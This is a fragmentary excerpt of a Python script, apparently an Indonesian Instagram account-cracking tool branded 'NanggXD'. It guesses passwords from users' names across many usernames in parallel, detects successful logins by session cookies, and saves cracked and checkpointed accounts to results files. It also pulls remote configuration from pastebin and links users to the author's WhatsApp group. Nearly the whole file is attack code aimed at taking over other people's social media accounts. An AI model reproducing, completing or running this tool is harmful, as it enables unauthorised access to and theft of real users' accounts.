...
reset = "[/]"
uadia, uadarimu, prox = [], [], []
sys.stdout.write('\x1b]2; NanggXD\x07')
...
class Instagram:
    ...
    def __init__(self):
        ...
        self.id, self.lo = [], 0
        self.gett()
        ###########self.Nangg = self.ses.get("https://api.countapi.xyz/hit/NanggXD/visits").json()["value"]
        self.menu()
    ...
    def logoo1(self):
        ...
        prints(Panel(f"""{P2}__________                        .__
\______   \_______   ____   _____ |__|__ __  _____
 |     ___/\_  __ \_/ __ \ /     \|  |  |  \/     \                                      |    |     |  | \/\  ___/|  Y Y  \  |  |  /  Y Y  \
...
\______   \_______   ____   _____ |__|__ __  _____
 ...
 |____|     |__|    \___  >__|_|  /__|____/|__|_|  /
  ...
  #      self.loadCookie(Instagram)
    ...
    def gett(self):
        try:
            iyh.update(self.ses.get("https://pastebin.com/raw/XbzEtwd").json())
        except requests.ConnectionError:
            self.logoo()
            print(f" {H}•{N} {M}Koneksi Internet Anda Bermasalah")
            time.sleep(3);exit()
    ...
    def menu(self):
     ...
     #   os.popen('data/play-audio/menu.mp3')
        ...
        if pil in ["", " "]:
            ...
            try:
                os.system("xdg-open https://wa.me/+62895414128194")
                time.sleep(2);exit()
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                print(f" {H}•{N} {M}Koneksi Internet Anda Bermasalah")
                exit()
 ...
 #           self.bots()        
    ...
    def lains(self):
        prints(Panel(f"{P2}[{color_rich}01{P2}]. Check Akun Hasil Crack     {P2}[{color_rich}03{P2}]. Settting UserAgent\n{P2}[{color_rich}02{P2}]. Gabung Group WhatsApp NanggXD      {P2}[{color_rich}04{P2}]. Ambil UserAgent",width=80,padding=(0,7),style=f"{color_table}"))
        prints(Panel(f"{P2}[{color_rich}05{P2}]. Lihat Jumlah Pengguna Script NanggXD\n{P2}[{color_rich}06{P2}]. Ganti Warna Tema Tools NanggXD",width=80,padding=(0,13),style=f"{color_table}"))
        ...
        if ask in ["",""]:
           ...
           time.sleep(2);self.menu()
            ...
            prints(Panel(f"{P2}Jumlah Pengguna Script NanggXD {color_rich}{self.Nangg}{P2} Orang",width=80,padding=(0,15),style=f"{color_table}"))
            time.sleep(3)
            print(f" {H}•{N} Kamu Adalah Pengguna Ke {H}{self.Nangg} {N}Terimakasih:)")
...
{N}[{H}+{N}] {H}LIVE{N}
 ...
 {N}├╴>{N} following : {H}{ful}{N}
    ...
    def getUserAgent(self):
        try:
            with requests.Session() as ses:
                 url_iphone = ses.get("https://pastebin.com/raw/XbzEtwd").text
                ...
                for user in self.id:
                    ...
                    for pasw in nama.split(" "):
                        ...
                        if 'satu' in method:
                           ...
                           bool.submit(self.Ngocok, usez, sandi)
            print("\r")
            prints(Panel(f" {P2}NanggXD {color_rich}{len(self.id)} {P2}Username Selesai Hasil OK : {H2}{len(self.ok)}{P2} Hasil CP : {K2}{len(self.cp)}{P2} ",width=80,padding=(0,8),style=f"{color_table}"))
            time.sleep(3);exit()
                    ...
                    with requests.Session() as ses:
                         ...
                         if "logged_in_user" in str(xnxx.text) or "sessionid" in ses.cookies.get_dict() or "userId" in str(xnxx.text):
                           ...
                           #   os.popen('play-audio rayok.mp3')
                              prints(Panel(pepekXD,style='',title=f'\r{H2}NANGG OK'))
                         ...
                         #     os.popen('play-audio raycp.mp3')
                              prints(Panel(pepekXD,style='',title=f'\r{K2}NANGG CP'))
                              self.ok.append(kntl)
                              with open("results/"+akunOK,"a", encoding="utf-8") as r:
                                   r.write(kntl+"\n")
                              break
                              ...
                              prog.update(des,description=f"[{M2} NanggXD {P2}] ( {M2}spam{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
                              time.sleep(15)
    ...
    def Ngocok(self, user, pasw):
        ...
        prog.update(des,description=f"NanggXD ( {H2}stabil{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
        prog.advance(des)
        for password in pasw:
            try:
             ...
             #       os.popen('play-audio raycp.mp3')
                    ...
                    prog.update(des,description=f"NanggXD ( {M2}spam{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
                    time.sleep(15)
            except requests.exceptions.ConnectionError:
                prog.update(des,description=f"NanggXD ( {M2}spam{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
                prog.advance(des)
